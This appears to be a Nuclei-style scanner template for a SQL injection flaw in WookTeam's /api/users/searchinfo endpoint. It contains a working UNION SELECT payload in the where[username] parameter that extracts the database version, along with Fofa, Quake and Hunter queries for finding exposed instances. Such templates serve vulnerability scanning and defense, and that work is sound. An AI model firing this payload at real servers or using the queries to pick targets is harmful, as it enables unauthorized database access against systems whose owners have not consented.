id: Wookteam_searchinfo_SQLi

info:
  name: Wookteam_searchinfo_SQLi
  author: HK
  severity: high
  description: WookTeam开源轻量级的在线团队协作工具searchinfo存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: title="Wookteam"
    Quake-query: title="Wookteam"
    Hunter-query: title="Wookteam"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /api/users/searchinfo?where[username]=1%27%29+UNION+ALL+SELECT+NULL%2CCONCAT%280x7e%2Cversion%28%29%2C0x7e%29%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: keep-alive

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - 'username'